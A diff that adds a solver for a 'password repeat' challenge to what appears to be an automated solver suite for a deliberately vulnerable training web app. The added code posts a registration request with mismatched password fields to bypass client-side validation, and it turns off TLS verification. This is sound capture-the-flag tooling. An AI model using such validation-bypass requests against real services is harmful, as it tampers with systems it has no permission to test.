@@ -80,3 +80,17 @@ def nft_mint(c: Client):
 @register_solver("manipulateClockChallenge", "Manipulate clock (best-effort)", CAT)
 def manipulate_clock(c: Client):
     warn("manipulateClock requires the web3/NFT time trick - browser step, not automated here")
+
+
+@register_solver("passwordRepeatChallenge", "Register with mismatched password repeat", CAT)
+def password_repeat(c: Client):
+    # Bypass client-side validation: send different password and passwordRepeat
+    r = c.s.post(c.url("/api/Users"),
+                 json={"email": "passrepeat_solver@test.local",
+                       "password": "Password1!",
+                       "passwordRepeat": "DifferentPassword!",
+                       "securityQuestion": {"id": 2},
+                       "securityAnswer": "solver"},
+                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
+    ok(f"registered user with mismatched password repeat ({r.status_code})")
+
